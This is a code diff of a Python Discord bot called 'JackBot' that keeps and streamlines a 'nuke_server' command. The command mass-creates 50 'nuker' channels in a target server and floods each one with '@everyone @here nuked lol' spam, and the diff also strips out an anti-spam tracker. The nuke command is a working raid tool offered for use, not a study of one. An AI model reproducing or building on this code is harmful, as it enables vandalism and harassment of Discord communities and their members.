@@ -1,8 +1,7 @@
 # JackBot - Clean Version (No AI / OpenAI)
-# Run: python bot.py
+# Run with: python bot.py
 
 import os
-import io
 import json
 import random
 import asyncio
@@ -24,12 +23,7 @@ if not TOKEN:
     exit()
 
 DATA_FILE = "bot_data.json"
-
-NUKE_KEY = "nuke8048"          # Change this to your secret key
-CHANNEL_BASE_NAME = "nuked"
-SPAM_MSG = "@everyone @here nuked lol"
-CHANNEL_COUNT = 50
-SPAM_COUNT = 300
+NUKE_KEY = "nuke8048"   # Change this to your secret key
 
 # Load / Save Data
 if not os.path.exists(DATA_FILE):
@@ -63,12 +57,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
 # ────────────────────────────────────────────────
-# ANTI-SPAM TRACKER
-# ────────────────────────────────────────────────
-spam_tracker = defaultdict(lambda: defaultdict(deque))
-
-# ────────────────────────────────────────────────
-# IMPROVED NUKE COMMAND
+# NUKE COMMAND
 # ────────────────────────────────────────────────
 @tree.command(name="nuke_server", description="DANGER - Nuke any server you're admin in")
 @app_commands.default_permissions(administrator=True)
@@ -111,7 +100,7 @@ async def nuke_server_cmd(interaction: discord.Interaction, server: str, key: st
 
         # Create channels
         created = 0
-        for i in range(CHANNEL_COUNT):
+        for i in range(50):
             try:
                 await target_guild.create_text_channel(f"nuker-{i+1}")
                 created += 1
@@ -125,7 +114,7 @@ async def nuke_server_cmd(interaction: discord.Interaction, server: str, key: st
         for ch in chans:
             for _ in range(20):
                 try:
-                    await ch.send(SPAM_MSG)
+                    await ch.send("@everyone @here nuked lol")
                     sent += 1
                 except:
                     pass
@@ -136,12 +125,36 @@ async def nuke_server_cmd(interaction: discord.Interaction, server: str, key: st
     except Exception as e:
         await interaction.followup.send(f"Error during nuke: {e}", ephemeral=True)
 
+# ────────────────────────────────────────────────
+# Basic Commands
+# ────────────────────────────────────────────────
+@tree.command(name="test", description="Test if bot is working")
+async def test(interaction: discord.Interaction):
+    await interaction.response.send_message("JackBot is working!", ephemeral=True)
 
-# Add more of your commands here...
+@tree.command(name="ping", description="Bot latency")
+async def ping(interaction: discord.Interaction):
+    latency = round(bot.latency * 1000)
+    await interaction.response.send_message(f"🏓 Pong! `{latency}ms`", ephemeral=False)
 
 # ────────────────────────────────────────────────
-# Run Bot
-# ───────────────────────────────────
+# on_ready with sync
+# ────────────────────────────────────────────────
+@bot.event
+async def on_ready():
+    print(f"✅ JackBot is online as {bot.user}")
+
+    # Sync commands to your server
+    try:
+        guild = discord.Object(id=1196980093248094340)  # Your server ID
+        synced = await bot.tree.sync(guild=guild)
+        print(f"✅ Synced {len(synced)} commands to your server")
+    except Exception as e:
+        print(f"Sync error: {e}")
+
+    print("JackBot is ready!")
+
+
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
